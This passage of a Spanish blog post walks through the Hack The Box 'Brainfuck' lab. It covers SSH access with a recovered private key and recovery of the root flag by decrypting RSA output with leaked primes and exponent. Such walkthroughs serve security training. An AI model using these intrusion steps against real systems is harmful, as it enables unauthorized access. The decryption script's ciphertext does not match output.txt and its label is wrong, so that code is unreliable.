+</code></pre></div></div>
+<h1 id="consiguiendo-acceso-inicial-por-ssh">Consiguiendo Acceso Inicial por SSH</h1>
+<pre><code class="language-BASH"># ssh -i id_rsa orestis@brainfuck.htb                                                                                                                                   255 ⨯
+The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.
+ECDSA key fingerprint is SHA256:S+b+YyJ/+y9IOr9GVEuonPnvVx4z7xUveQhJknzvBjg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'brainfuck.htb' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+You have mail.
+Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
+orestis@brainfuck:~$  
+</code></pre>
+
+<h1 id="privesc--enumeracion-del-sistema">Privesc / Enumeracion del Sistema</h1>
+
+<p>Enumeramos :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~<span class="nv">$ </span><span class="nb">ls
+</span>debug.txt  encrypt.sage  mail  output.txt  <span class="s2">"user.txt"</span>
+</code></pre></div></div>
+<p>Sacamos la Flag de <code class="language-plaintext highlighter-rouge">user.txt</code> y seguimos enumerando los diferentes recursos</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~<span class="nv">$ </span><span class="nb">cat </span>debug.txt 
+7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+
+orestis@brainfuck:~<span class="nv">$ </span><span class="nb">cat </span>output.txt 
+Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
+</code></pre></div></div>
+<p>Vamos a ver que es lo que hace este script que nos deja estos archivos con caracteres Decimales</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~<span class="nv">$ </span><span class="nb">cat </span>encrypt.sage 
+nbits <span class="o">=</span> 1024
+
+password <span class="o">=</span> open<span class="o">(</span><span class="s2">"/root/root.txt"</span><span class="o">)</span>.read<span class="o">()</span>.strip<span class="o">()</span>
+enc_pass <span class="o">=</span> open<span class="o">(</span><span class="s2">"output.txt"</span>,<span class="s2">"w"</span><span class="o">)</span>
+debug <span class="o">=</span> open<span class="o">(</span><span class="s2">"debug.txt"</span>,<span class="s2">"w"</span><span class="o">)</span>
+m <span class="o">=</span> Integer<span class="o">(</span>int<span class="o">(</span>password.encode<span class="o">(</span><span class="s1">'hex'</span><span class="o">)</span>,16<span class="o">))</span>
+
+p <span class="o">=</span> random_prime<span class="o">(</span>2^floor<span class="o">(</span>nbits/2<span class="o">)</span><span class="nt">-1</span>, <span class="nv">lbound</span><span class="o">=</span>2^floor<span class="o">(</span>nbits/2-1<span class="o">)</span>, <span class="nv">proof</span><span class="o">=</span>False<span class="o">)</span>
+q <span class="o">=</span> random_prime<span class="o">(</span>2^floor<span class="o">(</span>nbits/2<span class="o">)</span><span class="nt">-1</span>, <span class="nv">lbound</span><span class="o">=</span>2^floor<span class="o">(</span>nbits/2-1<span class="o">)</span>, <span class="nv">proof</span><span class="o">=</span>False<span class="o">)</span>
+n <span class="o">=</span> p<span class="k">*</span>q
+phi <span class="o">=</span> <span class="o">(</span>p-1<span class="o">)</span><span class="k">*</span><span class="o">(</span>q-1<span class="o">)</span>
+e <span class="o">=</span> ZZ.random_element<span class="o">(</span>phi<span class="o">)</span>
+<span class="k">while </span>gcd<span class="o">(</span>e, phi<span class="o">)</span> <span class="o">!=</span> 1:
+    e <span class="o">=</span> ZZ.random_element<span class="o">(</span>phi<span class="o">)</span>
+
+c <span class="o">=</span> pow<span class="o">(</span>m, e, n<span class="o">)</span>
+enc_pass.write<span class="o">(</span><span class="s1">'Encrypted Password: '</span>+str<span class="o">(</span>c<span class="o">)</span>+<span class="s1">'\n'</span><span class="o">)</span>
+debug.write<span class="o">(</span>str<span class="o">(</span>p<span class="o">)</span>+<span class="s1">'\n'</span><span class="o">)</span>
+debug.write<span class="o">(</span>str<span class="o">(</span>q<span class="o">)</span>+<span class="s1">'\n'</span><span class="o">)</span>
+debug.write<span class="o">(</span>str<span class="o">(</span>e<span class="o">)</span>+<span class="s1">'\n'</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Como no sabemos que es lo que esta haciendo vamos a copiar una parte del codigo para ver si encontramos el tipo de Cifrado que se esta empleando</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="o">=</span> random_prime<span class="o">(</span>2^floor<span class="o">(</span>nbits/2<span class="o">)</span><span class="nt">-1</span>, <span class="nv">lbound</span><span class="o">=</span>2^floor<span class="o">(</span>nbits/2-1<span class="o">)</span>, <span class="nv">proof</span><span class="o">=</span>False<span class="o">)</span>  <span class="s2">"[BUSQUEDA EN GOOGLE]"</span>
+</code></pre></div></div>
+<p>Parece que : <code class="language-plaintext highlighter-rouge">It is a standard RSA with e=5 an</code> encontrado en https://ctftime.org/writeup/6434</p>
+
+<p>Y encontramos un script para calcular las variables de la encriptacion RSA: ` P ` `  Q  ` ` E `
+<code class="language-plaintext highlighter-rouge">https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e</code></p>
+
+<p>Vamos a Setear el script con nuestras variables del archivo <code class="language-plaintext highlighter-rouge">debug.txt</code> y <code class="language-plaintext highlighter-rouge">output.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat decrypt.py                                                                                                                                                          1 ⨯</span>
+<span class="c">#!/usr/bin/python</span>
+
+<span class="c"># Funcion Principal de variables</span>
+
+def egcd<span class="o">(</span>a, b<span class="o">)</span>:
+    x,y, u,v <span class="o">=</span> 0,1, 1,0
+    <span class="k">while </span>a <span class="o">!=</span> 0:
+        q, r <span class="o">=</span> b//a, b%a
+        m, n <span class="o">=</span> x-u<span class="k">*</span>q, y-v<span class="k">*</span>q
+        b,a, x,y, u,v <span class="o">=</span> a,r, u,v, m,n
+        gcd <span class="o">=</span> b
+    <span class="k">return </span>gcd, x, y
+
+<span class="c"># Funcion Principal 1, seteamos las variables con las que teniamos en el archivo debug.txt</span>
+def main<span class="o">()</span>:
+
+    p <span class="o">=</span> 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+    q <span class="o">=</span> 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+    e <span class="o">=</span> 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+    ct <span class="o">=</span> 299604539773691895576847697095098784338054746292313044353582078965
+
+    <span class="c"># compute n</span>
+    n <span class="o">=</span> p <span class="k">*</span> q
+
+    <span class="c"># Compute phi(n)</span>
+    phi <span class="o">=</span> <span class="o">(</span>p - 1<span class="o">)</span> <span class="k">*</span> <span class="o">(</span>q - 1<span class="o">)</span>
+
+    <span class="c"># Compute modular inverse of e</span>
+    gcd, a, b <span class="o">=</span> egcd<span class="o">(</span>e, phi<span class="o">)</span>
+    d <span class="o">=</span> a
+
+    print<span class="o">(</span> <span class="s2">"n:  "</span> + str<span class="o">(</span>d<span class="o">)</span> <span class="o">)</span><span class="p">;</span>
+
+    <span class="c"># Decrypt ciphertext</span>
+    pt <span class="o">=</span> pow<span class="o">(</span>ct, d, n<span class="o">)</span>
+    print<span class="o">(</span> <span class="s2">"pt: "</span> + str<span class="o">(</span>pt<span class="o">)</span> <span class="o">)</span>
+
+<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
+    main<span class="o">()</span>
+</code></pre></div></div>
+<p>Una vez seteado todo lanzamos el script para ver si calculamos el valor correspondiente.
+Seteamos las variables y ejecutamos</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python decrypt.py                                                                                                                                                       1 ⚙</span>
+n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
+<span class="c"># Este es el Valor que queremos, PT, que se encuentra en valor DECIMAL, </span>
+pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
+</code></pre></div></div>
+<p>Ahora tenemos que pasar este codigo en DECIMAL A HEXADECIMAL y luego a Texto plano a normal
+Para ello vamos usar esta pagina web:
+https://www.rapidtables.com/convert/number/decimal-to-hex.html
+Ahora pasamo de <code class="language-plaintext highlighter-rouge">Decimal to HEX</code> 
+<code class="language-plaintext highlighter-rouge">Output: 3665666331613564626238393034373531636536353636613330356262386566</code></p>
+
+<p>Ahora de <code class="language-plaintext highlighter-rouge">HEX to TEXT</code>
+<code class="language-plaintext highlighter-rouge">Output: 6efc1a5dbb8904751ce6566a305bbxxxx</code></p>
+
+<p>Maquina <code class="language-plaintext highlighter-rouge">BRAINFUCK</code> rooteada =D !! Seguimos Full Hacks !!
+ Que parece ser la flag de <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/06/10/Brainfuck.html';
+     this.page.identifier = '/2021/06/10/Brainfuck';
+     this.page.title = 'OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Buff-Bof.html">
+            Maquina  Retirada Buff de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Attacktive-THM-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hacking/" class="set-4">Hacking</a> <a href="/tag/hacking%2C/" class="set-1">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/oscp/" class="set-4">OSCP</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path%2C/" class="set-4">Path,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-1">Web</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-1">Writeup</a> <a href="/tag/writeup%2C/" class="set-4">Writeup,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Writeup de la maquina de HackTheBox llamada BRAINFUCK siguiendo el PATH para el OSCP';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
